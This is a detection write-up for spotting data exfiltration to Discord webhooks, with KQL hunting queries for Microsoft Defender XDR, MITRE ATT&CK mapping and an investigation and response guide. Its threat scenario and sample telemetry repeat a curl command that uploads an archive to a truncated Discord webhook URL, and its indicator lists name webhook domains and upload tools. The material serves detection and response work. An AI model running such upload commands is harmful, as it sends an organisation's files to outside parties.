# Discord Webhook Exfiltration Detection

![Exfiltration](https://img.shields.io/badge/Category-Exfiltration-red)
![Microsoft Defender XDR](https://img.shields.io/badge/Microsoft-Defender_XDR-blue)
![KQL](https://img.shields.io/badge/KQL-Advanced_Hunting-green)
![MITRE ATT&CK](https://img.shields.io/badge/MITRE-ATT%26CK-orange)

## Overview

Discord webhooks provide a mechanism for sending data into Discord channels using HTTPS requests.

While intended for automation and notifications, attackers frequently abuse Discord webhooks as an exfiltration channel because Discord infrastructure is trusted, encrypted, and often allowed through enterprise firewalls.

This detection focuses on identifying unauthorized data uploads to Discord webhooks from enterprise endpoints.

---

## Threat Scenario

An attacker gains access to a system and stages sensitive data for exfiltration.

Traditional transfer methods such as SCP, FTP, or SFTP may be blocked by network controls.

The attacker pivots to Discord webhooks and uploads data using utilities such as:

```bash
curl -F file=@archive.tar.gz https://discord.com/api/webhooks/...
```

Because the traffic uses HTTPS and a legitimate cloud platform, it can blend into normal outbound activity.

---

## Detection Objective

Identify:

- Discord webhook usage
- File uploads via curl
- Unauthorized outbound data transfers
- Cloud-based exfiltration activity

---

## MITRE ATT&CK Mapping

### Tactic

```text
TA0010 - Exfiltration
TA0011 - Command and Control
```

### Techniques

```text
T1567.002 - Exfiltration to Cloud Storage Service
T1071.001 - Application Layer Protocol: Web Protocols
```

---

## Detection Logic

The detection searches for Discord webhook references within process command lines.

Indicators include:

```text
discord.com/api/webhooks
discordapp.com/api/webhooks
```

Common tooling:

```text
curl
wget
powershell
python
```

---

## Primary KQL Detection

```kusto
DeviceProcessEvents
| where ProcessCommandLine has "discord.com/api/webhooks"
| project
    Timestamp,
    DeviceName,
    AccountName,
    FileName,
    ProcessCommandLine
| order by Timestamp desc
```

---

## Enhanced Detection

```kusto
DeviceProcessEvents
| where ProcessCommandLine has_any (
    "discord.com/api/webhooks",
    "discordapp.com/api/webhooks"
)
| project
    Timestamp,
    DeviceName,
    AccountName,
    FileName,
    ProcessCommandLine
| order by Timestamp desc
```

---

## Network-Based Detection

```kusto
DeviceNetworkEvents
| where RemoteUrl contains "discord"
| project
    Timestamp,
    DeviceName,
    InitiatingProcessFileName,
    InitiatingProcessCommandLine,
    RemoteUrl,
    RemoteIP,
    RemotePort
| order by Timestamp desc
```

---

## Investigation Guide

### Step 1

Validate the process.

Review:

```text
Process Name
Parent Process
User Context
Command Line
```

---

### Step 2

Identify uploaded files.

Example:

```bash
curl -F file=@integration_state_2026-02-10_22-00-01.tar.gz
```

Determine:

- File type
- Data sensitivity
- Business justification

---

### Step 3

Review associated network activity.

Investigate:

```text
Remote IP
Remote URL
Connection Count
Bytes Transferred
```

---

### Step 4

Scope activity.

Search for:

```text
Discord
Webhook
Curl
Archive Creation
Compression Activity
```

Determine whether additional uploads occurred.

---

## Sample Telemetry

### Example Process Event

```bash
curl -F file=@integration_state_2026-02-10_22-00-01.tar.gz https://discord.com/api/webhooks/...
```

### Example Network Event

```text
RemoteIP: 162.159.135.232
RemotePort: 443
Protocol: HTTPS
```

---

## False Positives

Potential legitimate activity:

- Approved automation
- Internal DevOps integrations
- Security testing
- Authorized webhook notifications

---

## Detection Tuning

To reduce noise:

```kusto
| where ProcessCommandLine has "discord.com/api/webhooks"
| where ProcessCommandLine has "file=@"
```

This increases confidence that a file upload occurred.

---

## Response Actions

### Immediate

- Preserve evidence
- Export telemetry
- Capture process details

### Containment

- Isolate device
- Block Discord webhook domains
- Disable compromised accounts

### Eradication

- Remove malicious tooling
- Remove persistence
- Rotate credentials

### Recovery

- Restore operations
- Monitor for recurrence
- Validate controls

---

## Related Threat Hunt

This detection was derived from findings identified during:

```text
LIVEHunt 07 – Rocky Clinic Incident Investigation
```

Observed Activity:

```bash
curl -F file=@integration_state_2026-02-10_22-00-01.tar.gz https://discord.com/api/webhooks/...
```

Associated Endpoint:

```text
162.159.135.232:443
```

---

## References

### MITRE ATT&CK

https://attack.mitre.org/techniques/T1567/002/

https://attack.mitre.org/techniques/T1071/001/

### Microsoft Defender XDR

https://learn.microsoft.com/en-us/defender-xdr/advanced-hunting-overview

### Discord Webhooks

https://discord.com/developers/docs/resources/webhook
